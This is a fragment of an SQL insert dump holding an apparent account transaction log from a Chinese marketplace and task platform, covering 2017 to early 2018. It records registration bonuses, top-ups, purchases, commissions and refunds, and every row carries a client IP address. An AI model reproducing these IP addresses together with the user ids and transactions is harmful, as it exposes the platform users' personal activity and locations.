(6, '1488514516', 14, '发布任务预付订金(任务编号1488514516task14)', -100, '2017-03-03 12:15:16', '223.157.131.226', NULL, NULL, NULL),
(8, '1488515746', 14, '任务开始，冻结金额(任务编号1488514516task14)', -4900, '2017-03-03 12:35:46', '223.157.131.226', NULL, NULL, NULL),
(10, '1488537775', 14, '发布任务预付订金(任务编号1488537775task14)', -500, '2017-03-03 18:42:55', '223.157.131.226', NULL, NULL, NULL),
(11, '1488537841', 14, '发布任务预付订金(任务编号1488537841task14)', -1000, '2017-03-03 18:44:01', '223.157.131.226', NULL, NULL, NULL),
(12, '1488537927', 14, '发布任务预付订金(任务编号1488537927task14)', 0, '2017-03-03 18:45:27', '223.157.131.226', NULL, NULL, NULL),
(13, '1488545211', 15, '注册会员赠送金额', 10000, '2017-03-03 20:46:51', '223.157.131.226', NULL, NULL, NULL),
(14, '1488546317', 15, '申请开店，缴纳费用(续费12月)', -1010, '2017-03-03 21:05:17', '223.157.131.226', NULL, NULL, NULL),
(15, '1488546505', 15, '同步金额数字', 0, '2017-03-03 21:08:25', '223.157.131.226', NULL, NULL, NULL),
(16, '1488547312', 14, '同步金额数字', 0, '2017-03-03 21:21:52', '223.157.131.226', NULL, NULL, NULL),
(17, '1488548211', 16, '注册会员赠送金额', 0.01, '2017-03-03 21:36:51', '58.16.197.93', NULL, NULL, NULL),
(18, '1488682405', 17, '注册会员赠送金额', 0.01, '2017-03-05 10:53:25', '183.240.19.229', NULL, NULL, NULL),
(19, '1488887892', 18, '注册会员赠送', 0.01, '2017-03-07 19:58:12', '113.220.164.26', NULL, NULL, NULL),
(20, '1488975638', 19, '注册会员赠送金额', 0.01, '2017-03-08 20:20:38', '59.40.93.15', NULL, NULL, NULL),
(21, '1489034162', 20, '注册会员赠送', 0.01, '2017-03-09 12:36:02', '101.206.24.222', NULL, NULL, NULL),
(22, '1489046105', 21, '注册会员赠送', 0.01, '2017-03-09 15:55:05', '59.42.138.121', NULL, NULL, NULL),
(23, '1489051359', 22, '注册会员赠送金额', 0.01, '2017-03-09 17:22:39', '60.222.97.199', NULL, NULL, NULL),
(24, '1489059505', 23, '注册会员赠送', 0.01, '2017-03-09 19:38:25', '101.226.61.142', NULL, NULL, NULL),
(25, '1489216594', 24, '注册会员赠送金额', 0.01, '2017-03-11 15:16:34', '113.67.159.141', NULL, NULL, NULL),
(26, '1489412079', 25, '注册会员赠送', 0.01, '2017-03-13 21:34:39', '119.250.129.170', NULL, NULL, NULL),
(27, '1489571476', 26, '注册会员赠送', 0.01, '2017-03-15 17:51:16', '120.239.192.245', NULL, NULL, NULL),
(28, '1489648893', 14, '帐户金额充值', 8000, '2017-03-16 15:21:33', '223.157.155.51', NULL, NULL, NULL),
(29, '1489648899', 14, '购买商品,数量1', -800, '2017-03-16 15:21:39', '223.157.155.51', NULL, NULL, NULL),
(30, '1489648900', 14, '购买商品,数量5', -5000, '2017-03-16 15:21:40', '223.157.155.51', NULL, NULL, NULL),
(31, '1489648928', 15, '成功卖出商品，买方已确认收货，已自动扣除平台佣金160元', 640, '2017-03-16 15:22:08', '223.157.155.51', NULL, NULL, NULL),
(32, '1489648952', 15, '成功卖出商品，买方已确认收货，已自动扣除平台佣金1000元', 4000, '2017-03-16 15:22:32', '223.157.155.51', NULL, NULL, NULL),
(33, '1489653876', 14, '购买商品,数量2', -10, '2017-03-16 16:44:36', '223.157.155.51', NULL, NULL, NULL),
(34, '1489653925', 15, '成功卖出商品，买方已确认收货，已自动扣除平台佣金2元', 8, '2017-03-16 16:45:25', '223.157.155.51', NULL, NULL, NULL),
(35, '1489737764', 27, '注册会员赠送', 0.01, '2017-03-17 16:02:44', '183.240.22.84', NULL, NULL, NULL),
(36, '1489748651', 28, '注册会员赠送金额', 0.01, '2017-03-17 19:04:11', '110.82.68.66', NULL, NULL, NULL),
(37, '1489767190', 29, '注册会员赠送金额', 0.01, '2017-03-18 00:13:10', '49.84.201.131', NULL, NULL, NULL),
(38, '1490452021', 30, '注册会员赠送', 0.01, '2017-03-25 22:27:01', '111.73.175.22', NULL, NULL, NULL),
(39, '1490631674', 31, '注册会员赠送', 0.01, '2017-03-28 00:21:14', '120.85.67.108', NULL, NULL, NULL),
(40, '1490796134', 32, '注册会员赠送', 0.01, '2017-03-29 22:02:14', '43.250.200.188', NULL, NULL, NULL),
(41, '1490927440', 33, '注册会员赠送', 0.01, '2017-03-31 10:30:40', '124.207.28.124', NULL, NULL, NULL),
(42, '1490949088', 34, '注册会员赠送', 0.01, '2017-03-31 16:31:28', '36.149.218.194', NULL, NULL, NULL),
(43, '1491222000', 35, '注册会员赠送', 0.01, '2017-04-03 20:20:00', '117.91.162.103', NULL, NULL, NULL),
(44, '1491322310', 36, '注册会员赠送金额', 0.01, '2017-04-05 00:11:50', '175.1.72.88', NULL, NULL, NULL),
(45, '1491392071', 37, '注册会员赠送金额', 0.01, '2017-04-05 19:34:31', '112.116.113.220', NULL, NULL, NULL),
(46, '1491542007', 38, '注册会员赠送金额', 0.01, '2017-04-07 13:13:27', '218.86.154.133', NULL, NULL, NULL),
(47, '1491567672', 39, '注册会员赠送金额', 0.01, '2017-04-07 20:21:12', '183.222.131.38', NULL, NULL, NULL),
(48, '1491626194', 40, '注册会员赠送金额', 0.01, '2017-04-08 12:36:34', '223.104.90.74', NULL, NULL, NULL),
(49, '1491654088', 40, '积分兑换金钱', 1, '2017-04-08 20:21:28', '120.192.66.163', NULL, NULL, NULL),
(50, '1491708970', 41, '注册会员赠送金额', 0.01, '2017-04-09 11:36:10', '113.88.82.82', NULL, NULL, NULL),
(51, '1493582073', 41, '帐户金额充值', 56454, '2017-05-01 03:54:33', '124.231.162.4', NULL, NULL, NULL),
(52, '1493582086', 41, '购买商品,数量1', -44, '2017-05-01 03:54:46', '124.231.162.4', NULL, NULL, NULL),
(53, '1493582101', 15, '成功卖出商品，买方已确认收货，已自动扣除平台佣金8.8元', 35.2, '2017-05-01 03:55:01', '124.231.162.4', NULL, NULL, NULL),
(54, '1493582317', 39, '卡密直充50元', 50, '2017-05-01 03:58:37', '124.231.162.4', NULL, NULL, NULL),
(55, '1493649284', 15, '缴纳保证金', -3000, '2017-05-01 22:34:44', '124.231.162.4', NULL, NULL, NULL),
(56, '1493823832', 42, '注册会员赠送金额', 0.01, '2017-05-03 23:03:52', '182.131.125.214', NULL, NULL, NULL),
(57, '1493830400', 43, '注册会员赠送金额', 0.01, '2017-05-04 00:53:20', '39.128.40.228', NULL, NULL, NULL),
(58, '1493861013', 44, '注册会员赠送金额', 0.01, '2017-05-04 09:23:33', '27.192.37.159', NULL, NULL, NULL),
(59, '1493861156', 45, '注册会员赠送金额', 0.01, '2017-05-04 09:25:56', '110.182.204.34', NULL, NULL, NULL),
(60, '1493914182', 45, '缴纳保证金', -0.01, '2017-05-05 00:09:42', '113.80.11.191', NULL, NULL, NULL),
(61, '1493978000', 46, '注册会员赠送金额', 0.01, '2017-05-05 17:53:20', '14.17.37.143', NULL, NULL, NULL),
(62, '1494138979', 47, '注册会员赠送金额', 0.01, '2017-05-07 14:36:19', '36.149.71.177', NULL, NULL, NULL),
(63, '1494168827', 48, '注册会员赠送金额', 0.01, '2017-05-07 22:53:47', '118.205.173.84', NULL, NULL, NULL),
(64, '1494170653', 48, '帐户金额充值', 11111, '2017-05-07 23:24:13', '118.205.173.84', NULL, NULL, NULL),
(65, '1494170722', 48, '购买商品,数量1', -5, '2017-05-07 23:25:22', '118.205.173.84', NULL, NULL, NULL),
(66, '1494170759', 15, '成功卖出商品，买方已确认收货，已自动扣除平台佣金1元', 4, '2017-05-07 23:25:59', '118.205.173.84', NULL, NULL, NULL),
(67, '1494170827', 48, '购买商品,数量1', -1399, '2017-05-07 23:27:07', '118.205.173.84', NULL, NULL, NULL),
(68, '1494170845', 48, '同步金额数字', 0, '2017-05-07 23:27:25', '118.205.173.84', NULL, NULL, NULL),
(69, '1494199927', 49, '注册会员赠送金额', 0.01, '2017-05-08 07:32:07', '182.241.165.3', NULL, NULL, NULL),
(70, '1494211208', 50, '注册会员赠送金额', 0.01, '2017-05-08 10:40:08', '27.214.234.195', NULL, NULL, NULL),
(71, '1494246045', 51, '注册会员赠送金额', 0.01, '2017-05-08 20:20:45', '112.231.38.10', NULL, NULL, NULL),
(73, '1494376400', 53, '注册会员赠送金额', 0.01, '2017-05-10 08:33:20', '111.30.81.121', NULL, NULL, NULL),
(74, '1494376544', 53, '支付宝充值19.99元', 19.99, '2017-05-10 08:35:44', '110.75.248.112', NULL, NULL, NULL),
(75, '1494376547', 53, '购买商品,数量1', -20, '2017-05-10 08:35:47', '110.75.248.112', NULL, NULL, NULL),
(77, '1494509394', 55, '注册会员赠送金额', 0.01, '2017-05-11 21:29:54', '59.46.38.53', NULL, NULL, NULL),
(78, '1494549331', 55, '帐户金额充值', 10000, '2017-05-12 08:35:31', '59.46.38.53', NULL, NULL, NULL),
(79, '1494549933', 55, '购买商品,数量1', -100, '2017-05-12 08:45:33', '59.46.38.53', NULL, NULL, NULL),
(80, '1494554841', 56, '注册会员赠送金额', 0.01, '2017-05-12 10:07:21', '60.171.240.222', NULL, NULL, NULL),
(81, '1494597630', 57, '注册会员赠送金额', 0.01, '2017-05-12 22:00:30', '58.211.2.36', NULL, NULL, NULL),
(82, '1494639919', 58, '注册会员赠送金额', 0.01, '2017-05-13 09:45:19', '117.34.13.96', NULL, NULL, NULL),
(83, '1494680177', 59, '注册会员赠送金额', 0.01, '2017-05-13 20:56:17', '117.34.13.30', NULL, NULL, NULL),
(84, '1494680210', 59, '帐户金额充值', 200, '2017-05-13 20:56:50', '117.34.13.30', NULL, NULL, NULL),
(85, '1494680281', 59, '购买商品,数量1', -5, '2017-05-13 20:58:01', '117.34.13.30', NULL, NULL, NULL),
(86, '1494680339', 15, '成功卖出商品，买方已确认收货，已自动扣除平台佣金1元', 4, '2017-05-13 20:58:59', '117.34.13.30', NULL, NULL, NULL),
(87, '1494680577', 59, '购买商品,数量1', -10, '2017-05-13 21:02:57', '117.34.13.30', NULL, NULL, NULL),
(88, '1494680977', 59, '购买商品,数量1', -10, '2017-05-13 21:09:37', '117.34.13.30', NULL, NULL, NULL),
(89, '1494681000', 15, '成功卖出商品，买方已确认收货，已自动扣除平台佣金2元', 8, '2017-05-13 21:10:00', '117.34.13.30', NULL, NULL, NULL),
(90, '1494682437', 59, '微信充值0.01元', 0.01, '2017-05-13 21:33:57', '58.211.2.78', NULL, NULL, NULL),
(91, '1494814483', 60, '注册会员赠送金额', 0.01, '2017-05-15 10:14:43', '117.34.13.12', NULL, NULL, NULL),
(92, '1494814906', 53, '卖家未在指定时间内处理退款申请，系统默认同意退款', 20, '2017-05-15 10:21:46', '101.227.207.48', NULL, NULL, NULL),
(93, '1494814906', 15, '买家未在有效时间内确认收货，系统自动确认收货，已自动扣除平台佣金279.8元', 1119.2, '2017-05-15 10:21:46', '101.227.207.48', NULL, NULL, NULL),
(94, '1494814906', 15, '买家未在有效时间内确认收货，系统自动确认收货，已自动扣除平台佣金20元', 80, '2017-05-15 10:21:46', '101.227.207.48', NULL, NULL, NULL),
(95, '1494815000', 61, '注册会员赠送金额', 0.01, '2017-05-15 10:23:20', '101.227.207.48', NULL, NULL, NULL),
(96, '1494866187', 62, '注册会员赠送', 0.01, '2017-05-16 00:36:27', '42.236.93.26', NULL, NULL, NULL),
(97, '1494925816', 63, '注册会员赠送金额', 0.01, '2017-05-16 17:10:16', '58.211.2.6', NULL, NULL, NULL),
(98, '1495466716', 64, '注册会员赠送金额', 0.01, '2017-05-22 23:25:16', '117.34.13.60', NULL, NULL, NULL),
(99, '1495470755', 65, '注册会员赠送金额', 0.01, '2017-05-23 00:32:35', '116.31.126.101', NULL, NULL, NULL),
(100, '1495863695', 66, '注册会员赠送金额', 0.01, '2017-05-27 13:41:35', '115.231.186.36', NULL, NULL, NULL),
(101, '1497326690', 67, '注册会员赠送金额', 0.01, '2017-06-13 12:04:50', '59.51.81.178', NULL, NULL, NULL),
(102, '1497874810', 39, '购买商品,数量1', -20, '2017-06-19 20:20:10', '122.190.2.6', NULL, NULL, NULL),
(103, '1497875034', 39, '购买商品,数量1', -20, '2017-06-19 20:23:54', '122.190.2.6', NULL, NULL, NULL),
(104, '1497875481', 39, '购买商品,数量1', -10, '2017-06-19 20:31:21', '122.190.2.6', NULL, NULL, NULL),
(105, '1498016488', 68, '注册会员赠送金额', 0.01, '2017-06-21 11:41:28', '115.231.186.72', NULL, NULL, NULL),
(106, '1498166777', 69, '注册会员赠送金额', 0.01, '2017-06-23 05:26:17', '116.31.126.211', NULL, NULL, NULL),
(107, '1498317509', 70, '注册会员赠送金额', 0.01, '2017-06-24 23:18:29', '116.31.126.105', NULL, NULL, NULL),
(108, '1498757037', 71, '注册会员赠送金额', 0.01, '2017-06-30 01:23:57', '223.157.220.85', NULL, NULL, NULL),
(113, '1499351605', 14, '任务开始，冻结金额(任务编号1499351601task14)', -500, '2017-07-06 22:33:25', '113.220.229.187', NULL, NULL, NULL),
(114, '1499351755', 59, '帐户金额充值', 5000, '2017-07-06 22:35:55', '113.220.229.187', NULL, NULL, NULL),
(115, '1499351832', 59, '任务开始，冻结金额(任务编号1499351829task59)', -1000, '2017-07-06 22:37:12', '113.220.229.187', NULL, NULL, NULL),
(119, '1500327530', 14, '任务到期，退回已冻结金额(任务编号1499351601task14)', 500, '2017-07-18 05:38:50', '175.20.90.184', NULL, NULL, NULL),
(122, '1500745106', 15, '买家未在有效时间内确认收货，系统自动确认收货，已自动扣除平台佣金4元', 16, '2017-07-23 01:38:26', '183.21.191.123', NULL, NULL, NULL),
(123, '1500745277', 15, '买家未在有效时间内确认收货，系统自动确认收货，已自动扣除平台佣金4元', 16, '2017-07-23 01:41:17', '183.21.191.123', NULL, NULL, NULL),
(124, '1500745282', 15, '买家未在有效时间内确认收货，系统自动确认收货，已自动扣除平台佣金4元', 16, '2017-07-23 01:41:22', '183.21.191.123', NULL, NULL, NULL),
(126, '1500804067', 15, '买家未在有效时间内确认收货，系统自动确认收货，已自动扣除平台佣金4元', 16, '2017-07-23 18:01:07', '183.21.191.123', NULL, NULL, NULL),
(127, '1500804071', 15, '买家未在有效时间内确认收货，系统自动确认收货，已自动扣除平台佣金4元', 16, '2017-07-23 18:01:11', '183.21.191.123', NULL, NULL, NULL),
(128, '1500804085', 15, '买家未在有效时间内确认收货，系统自动确认收货，已自动扣除平台佣金4元', 16, '2017-07-23 18:01:25', '183.21.191.123', NULL, NULL, NULL),
(129, '1500804089', 15, '买家未在有效时间内确认收货，系统自动确认收货，已自动扣除平台佣金4元', 16, '2017-07-23 18:01:29', '183.21.191.123', NULL, NULL, NULL),
(130, '1500804098', 15, '买家未在有效时间内确认收货，系统自动确认收货，已自动扣除平台佣金4元', 16, '2017-07-23 18:01:38', '183.21.191.123', NULL, NULL, NULL),
(132, '1501082362', 15, '买家未在有效时间内确认收货，系统自动确认收货，已自动扣除平台佣金4元', 16, '2017-07-26 23:19:22', '183.21.190.221', NULL, NULL, NULL),
(134, '1501474256', 59, '任务到期，退回已冻结金额(任务编号1499351829task59)', 1000, '2017-07-31 12:10:56', '175.20.90.191', NULL, NULL, NULL),
(138, '1502438968', 15, '买家未在有效时间内确认收货，系统自动确认收货，已自动扣除平台佣金4元', 16, '2017-08-11 16:09:28', '124.231.174.4', NULL, NULL, NULL),
(139, '1502438999', 15, '买家未在有效时间内确认收货，系统自动确认收货，已自动扣除平台佣金4元', 16, '2017-08-11 16:09:59', '124.231.174.4', NULL, NULL, NULL),
(140, '1502439000', 15, '买家未在有效时间内确认收货，系统自动确认收货，已自动扣除平台佣金4元', 16, '2017-08-11 16:10:00', '124.231.174.4', NULL, NULL, NULL),
(141, '1502439001', 15, '买家未在有效时间内确认收货，系统自动确认收货，已自动扣除平台佣金4元', 16, '2017-08-11 16:10:01', '124.231.174.4', NULL, NULL, NULL),
(142, '1502439001', 15, '买家未在有效时间内确认收货，系统自动确认收货，已自动扣除平台佣金4元', 16, '2017-08-11 16:10:01', '124.231.174.4', NULL, NULL, NULL),
(143, '1502439002', 15, '买家未在有效时间内确认收货，系统自动确认收货，已自动扣除平台佣金4元', 16, '2017-08-11 16:10:02', '124.231.174.4', NULL, NULL, NULL),
(144, '1502439002', 15, '买家未在有效时间内确认收货，系统自动确认收货，已自动扣除平台佣金4元', 16, '2017-08-11 16:10:02', '124.231.174.4', NULL, NULL, NULL),
(145, '1502439003', 15, '买家未在有效时间内确认收货，系统自动确认收货，已自动扣除平台佣金4元', 16, '2017-08-11 16:10:03', '124.231.174.4', NULL, NULL, NULL),
(146, '1502439003', 15, '买家未在有效时间内确认收货，系统自动确认收货，已自动扣除平台佣金4元', 16, '2017-08-11 16:10:03', '124.231.174.4', NULL, NULL, NULL),
(147, '1502439003', 15, '买家未在有效时间内确认收货，系统自动确认收货，已自动扣除平台佣金4元', 16, '2017-08-11 16:10:03', '124.231.174.4', NULL, NULL, NULL),
(148, '1502439005', 15, '买家未在有效时间内确认收货，系统自动确认收货，已自动扣除平台佣金4元', 16, '2017-08-11 16:10:05', '124.231.174.4', NULL, NULL, NULL),
(149, '1502439006', 15, '买家未在有效时间内确认收货，系统自动确认收货，已自动扣除平台佣金4元', 16, '2017-08-11 16:10:06', '124.231.174.4', NULL, NULL, NULL),
(150, '1502439009', 15, '买家未在有效时间内确认收货，系统自动确认收货，已自动扣除平台佣金4元', 16, '2017-08-11 16:10:09', '124.231.174.4', NULL, NULL, NULL),
(151, '1502439009', 15, '买家未在有效时间内确认收货，系统自动确认收货，已自动扣除平台佣金4元', 16, '2017-08-11 16:10:09', '124.231.174.4', NULL, NULL, NULL),
(152, '1502439011', 15, '买家未在有效时间内确认收货，系统自动确认收货，已自动扣除平台佣金4元', 16, '2017-08-11 16:10:11', '124.231.174.4', NULL, NULL, NULL),
(153, '1502439024', 15, '买家未在有效时间内确认收货，系统自动确认收货，已自动扣除平台佣金4元', 16, '2017-08-11 16:10:24', '124.231.174.4', NULL, NULL, NULL),
(157, '1502645726', 15, '买家未在有效时间内确认收货，系统自动确认收货，已自动扣除平台佣金4元', 16, '2017-08-14 01:35:26', '175.2.122.10', NULL, NULL, NULL),
(158, '1502645726', 15, '买家未在有效时间内确认收货，系统自动确认收货，已自动扣除平台佣金4元', 16, '2017-08-14 01:35:26', '175.2.122.10', NULL, NULL, NULL),
(159, '1502645726', 15, '买家未在有效时间内确认收货，系统自动确认收货，已自动扣除平台佣金2元', 8, '2017-08-14 01:35:26', '175.2.122.10', NULL, NULL, NULL),
(160, '1502645759', 14, '购买商品,数量1', -1000, '2017-08-14 01:35:59', '175.2.122.10', NULL, NULL, NULL),
(163, '1502864641', 46, '帐户金额充值', 100, '2017-08-16 14:24:01', '61.141.152.48', NULL, NULL, NULL),
(164, '1502864690', 46, '购买商品,数量1', -58, '2017-08-16 14:24:50', '61.141.152.48', NULL, NULL, NULL),
(165, '1503011857', 92, '注册会员赠送金额', 0.01, '2017-08-18 07:17:37', '113.94.55.151', NULL, NULL, NULL),
(166, '1503102579', 93, '注册会员赠送金额', 0.01, '2017-08-19 08:29:39', '182.242.169.227', NULL, NULL, NULL),
(167, '1503157623', 94, '注册会员赠送金额', 0.01, '2017-08-19 23:47:03', '125.78.90.207', NULL, NULL, NULL),
(168, '1503454014', 95, '注册会员赠送', 0.01, '2017-08-23 10:06:54', '120.229.103.164', NULL, NULL, NULL),
(169, '1504166110', 15, '买家未在有效时间内确认收货，系统自动确认收货，已自动扣除平台佣金200元', 800, '2017-08-31 15:55:10', '223.157.152.215', NULL, NULL, NULL),
(170, '1504166110', 15, '买家未在有效时间内确认收货，系统自动确认收货，已自动扣除平台佣金11.6元', 46.4, '2017-08-31 15:55:10', '223.157.152.215', NULL, NULL, NULL),
(171, '1504169485', 96, '注册会员赠送金额', 0.01, '2017-08-31 16:51:25', '171.92.217.8', NULL, NULL, NULL),
(172, '1504271661', 97, '注册会员赠送金额', 0.01, '2017-09-01 21:14:21', '111.198.38.182', NULL, NULL, NULL),
(173, '1504419909', 98, '注册会员赠送金额', 0.01, '2017-09-03 14:25:09', '39.90.33.216', NULL, NULL, NULL),
(174, '1504439636', 99, '注册会员赠送金额', 0.01, '2017-09-03 19:53:56', '113.248.157.83', NULL, NULL, NULL),
(175, '1504603003', 100, '注册会员赠送金额', 0.01, '2017-09-05 17:16:43', '221.222.68.12', NULL, NULL, NULL),
(176, '1504605542', 101, '注册会员赠送金额', 0.01, '2017-09-05 17:59:02', '113.68.130.143', NULL, NULL, NULL),
(177, '1504633508', 102, '注册会员赠送金额', 0.01, '2017-09-06 01:45:08', '125.116.208.181', NULL, NULL, NULL),
(178, '1504666514', 103, '注册会员赠送金额', 0.01, '2017-09-06 10:55:14', '223.96.220.207', NULL, NULL, NULL),
(179, '1504718596', 104, '注册会员赠送金额', 0.01, '2017-09-07 01:23:16', '223.96.222.136', NULL, NULL, NULL),
(180, '1504750009', 105, '注册会员赠送金额', 0.01, '2017-09-07 10:06:49', '223.96.222.114', NULL, NULL, NULL),
(181, '1504769570', 105, '帐户金额充值', 5000, '2017-09-07 15:32:50', '113.220.165.196', NULL, NULL, NULL),
(182, '1504769583', 105, '购买商品,数量1', -80, '2017-09-07 15:33:03', '113.220.165.196', NULL, NULL, NULL),
(183, '1504792552', 105, '帐户金额扣除', -4920.01, '2017-09-07 21:55:52', '222.41.112.170', NULL, NULL, NULL),
(184, '1504792590', 105, '支付宝充值0.01元', 0.01, '2017-09-07 21:56:30', '110.75.242.136', NULL, NULL, NULL),
(185, '1504792779', 100, '支付宝充值0.01元', 0.01, '2017-09-07 21:59:39', '110.75.242.154', NULL, NULL, NULL),
(186, '1504792779', 100, '购买商品,数量1', -0.02, '2017-09-07 21:59:39', '110.75.242.154', NULL, NULL, NULL),
(187, '1504884544', 106, '注册会员赠送金额', 0.01, '2017-09-08 23:29:04', '36.40.29.95', NULL, NULL, NULL),
(188, '1505208625', 107, '注册会员赠送金额', 0.01, '2017-09-12 17:30:25', '60.171.240.222', NULL, NULL, NULL),
(189, '1505405968', 108, '注册会员赠送金额', 0.01, '2017-09-15 00:19:28', '223.166.20.195', NULL, NULL, NULL),
(190, '1505435678', 109, '注册会员赠送金额', 0.01, '2017-09-15 08:34:38', '14.127.231.47', NULL, NULL, NULL),
(191, '1505467100', 110, '注册会员赠送', 0.01, '2017-09-15 17:18:20', '163.142.51.9', NULL, NULL, NULL),
(192, '1505642556', 111, '注册会员赠送金额', 0.01, '2017-09-17 18:02:36', '223.96.221.164', NULL, NULL, NULL),
(193, '1505653633', 14, '买家未在有效时间内确认收货，系统自动确认收货，已自动扣除平台佣金0元', 80, '2017-09-17 21:07:13', '222.242.66.187', NULL, NULL, NULL),
(194, '1505653633', 15, '买家未在有效时间内确认收货，系统自动确认收货，已自动扣除平台佣金0.004元', 0.02, '2017-09-17 21:07:13', '222.242.66.187', NULL, NULL, NULL),
(195, '1505663620', 111, '帐户金额充值', 5000, '2017-09-17 23:53:40', '222.242.66.187', NULL, NULL, NULL),
(196, '1505663719', 111, '购买商品,数量1', -59, '2017-09-17 23:55:19', '222.242.66.187', NULL, NULL, NULL),
(197, '1505664144', 15, '退款纠纷，判定卖方胜诉，已自动扣除平台佣金11.8元', 47.2, '2017-09-18 00:02:24', '222.242.66.187', NULL, NULL, NULL),
(198, '1507820631', 112, '注册会员赠送金额', 0.01, '2017-10-12 23:03:51', '223.87.102.31', NULL, NULL, NULL),
(199, '1507903459', 113, '注册会员赠送金额', 0.01, '2017-10-13 22:04:19', '123.190.77.200', NULL, NULL, NULL),
(200, '1508213053', 114, '注册会员赠送金额', 0.01, '2017-10-17 12:04:13', '58.254.108.123', NULL, NULL, NULL),
(201, '1508218245', 115, '注册会员赠送金额', 0.01, '2017-10-17 13:30:45', '223.64.187.150', NULL, NULL, NULL),
(202, '1508241437', 116, '注册会员赠送金额', 0.01, '2017-10-17 19:57:17', '222.222.189.58', NULL, NULL, NULL),
(203, '1508255953', 117, '注册会员赠送金额', 0.01, '2017-10-17 23:59:13', '101.247.220.60', NULL, NULL, NULL),
(204, '1508295983', 118, '注册会员赠送金额', 0.01, '2017-10-18 11:06:23', '183.11.130.112', NULL, NULL, NULL),
(205, '1508399405', 119, '注册会员赠送金额', 0.01, '2017-10-19 15:50:05', '116.8.36.90', NULL, NULL, NULL),
(206, '1508940648', 120, '注册会员赠送金额', 0.01, '2017-10-25 22:10:48', '1.89.233.190', NULL, NULL, NULL),
(207, '1509340790', 121, '注册会员赠送金额', 0.01, '2017-10-30 13:19:50', '1.89.233.190', NULL, NULL, NULL),
(208, '1509469615', 122, '注册会员赠送金额', 0.01, '2017-11-01 01:06:55', '183.40.1.97', NULL, NULL, NULL),
(209, '1509601565', 123, '注册会员赠送金额', 0.01, '2017-11-02 13:46:05', '182.140.175.143', NULL, NULL, NULL),
(210, '1509950640', 124, '注册会员赠送金额', 0.01, '2017-11-06 14:44:00', '110.82.171.33', NULL, NULL, NULL),
(211, '1510194704', 125, '注册会员赠送金额', 0.01, '2017-11-09 10:31:44', '115.217.117.12', NULL, NULL, NULL),
(212, '1510991587', 126, '注册会员赠送金额', 0.01, '2017-11-18 15:53:07', '123.161.25.188', NULL, NULL, NULL),
(213, '1511006135', 111, '购买商品,数量1', -1000, '2017-11-18 19:55:35', '58.16.124.63', NULL, NULL, NULL),
(214, '1511067604', 127, '注册会员赠送金额', 0.01, '2017-11-19 13:00:04', '27.47.232.107', NULL, NULL, NULL),
(215, '1511112829', 128, '注册会员赠送金额', 0.01, '2017-11-20 01:33:49', '113.86.38.248', NULL, NULL, NULL),
(216, '1511154636', 129, '注册会员赠送金额', 0.01, '2017-11-20 13:10:36', '42.199.131.17', NULL, NULL, NULL),
(217, '1511199586', 130, '注册会员赠送金额', 0.01, '2017-11-21 01:39:46', '116.8.38.248', NULL, NULL, NULL),
(218, '1511241827', 131, '注册会员赠送金额', 0.01, '2017-11-21 13:23:47', '36.98.36.246', NULL, NULL, NULL),
(219, '1511323092', 132, '注册会员赠送金额', 0.01, '2017-11-22 11:58:12', '113.110.103.15', NULL, NULL, NULL),
(220, '1511628034', 133, '注册会员赠送金额', 0.01, '2017-11-26 00:40:34', '120.230.77.0', NULL, NULL, NULL),
(221, '1511638564', 134, '注册会员赠送金额', 0.01, '2017-11-26 03:36:04', '120.229.3.193', NULL, NULL, NULL),
(222, '1511639273', 134, '缴纳保证金', -0.01, '2017-11-26 03:47:53', '120.229.3.193', NULL, NULL, NULL),
(223, '1511752422', 135, '注册会员赠送金额', 0.01, '2017-11-27 11:13:42', '119.176.200.29', NULL, NULL, NULL),
(224, '1511799310', 15, '买家未在有效时间内确认收货，系统自动确认收货，已自动扣除平台佣金200元', 800, '2017-11-28 00:15:10', '113.88.197.179', NULL, NULL, NULL),
(225, '1511899118', 136, '注册会员赠送金额', 0.01, '2017-11-29 03:58:38', '120.15.178.174', NULL, NULL, NULL),
(226, '1512873687', 137, '注册会员赠送金额', 0.01, '2017-12-10 10:41:27', '113.225.168.54', NULL, NULL, NULL),
(227, '1513093018', 138, '注册会员赠送金额', 0.01, '2017-12-12 23:36:58', '223.157.221.143', NULL, NULL, NULL),
(228, '1513223827', 139, '注册会员赠送金额', 0.01, '2017-12-14 11:57:07', '111.19.44.228', NULL, NULL, NULL),
(229, '1513255708', 140, '注册会员赠送金额', 0.01, '2017-12-14 20:48:28', '116.18.228.242', NULL, NULL, NULL),
(230, '1513319153', 141, '注册会员赠送金额', 0.01, '2017-12-15 14:25:53', '101.226.225.84', NULL, NULL, NULL),
(231, '1514476710', 142, '注册会员赠送金额', 0.01, '2017-12-28 23:58:30', '119.134.103.52', NULL, NULL, NULL),
(232, '1514732801', 14, '购买商品,数量1', -50, '2017-12-31 23:06:41', '175.15.66.151', NULL, NULL, NULL),
(233, '1514732818', 14, '购买商品,数量1', -100, '2017-12-31 23:06:58', '175.15.66.151', NULL, NULL, NULL),
(234, '1514732830', 15, '成功卖出商品，买方已确认收货，已自动扣除平台佣金20元', 80, '2017-12-31 23:07:10', '175.15.66.151', NULL, NULL, NULL),
(235, '1515762984', 143, '注册会员赠送金额', 0.01, '2018-01-12 21:16:24', '183.226.92.165', NULL, NULL, NULL),
(236, '1515919281', 15, '买家未在有效时间内确认收货，系统自动确认收货，已自动扣除平台佣金10元', 40, '2018-01-14 16:41:21', '223.157.112.158', NULL, NULL, NULL),
(237, '1515919337', 15, '买家未在有效时间内确认收货，系统自动确认收货，已自动扣除平台佣金2元', 8, '2018-01-14 16:42:17', '223.157.112.158', NULL, NULL, NULL),
(238, '1516209707', 144, '注册会员赠送金额', 0.01, '2018-01-18 01:21:47', '120.239.209.185', NULL, NULL, NULL),
(239, '1516518297', 145, '注册会员赠送金额', 0.01, '2018-01-21 15:04:57', '119.134.103.56', NULL, NULL, NULL),
(240, '1516775581', 146, '注册会员赠送金额', 0.01, '2018-01-24 14:33:01', '14.25.41.157', NULL, NULL, NULL),
(241, '1516784129', 147, '注册会员赠送金额', 0.01, '2018-01-24 16:55:29', '223.157.142.250', NULL, NULL, NULL),
(242, '1517125438', 147, '帐户金额充值', 200, '2018-01-28 15:43:58', '175.2.121.79', NULL, NULL, NULL),
(243, '1517125471', 147, '购买商品,数量1', -59, '2018-01-28 15:44:31', '175.2.121.79', NULL, NULL, NULL),
(244, '1517138170', 14, '帐户金额扣除', -1120, '2018-01-28 19:16:10', '175.2.121.79', NULL, NULL, NULL),
(245, '1517378603', 15, '买家未在有效时间内确认收货，系统自动确认收货，已自动扣除平台佣金11.8元', 47.2, '2018-01-31 14:03:23', '175.2.0.178', NULL, NULL, NULL),
(246, '1517378700', 15, '微信充值1元', 1, '2018-01-31 14:05:00', '140.207.54.75', NULL, NULL, NULL),
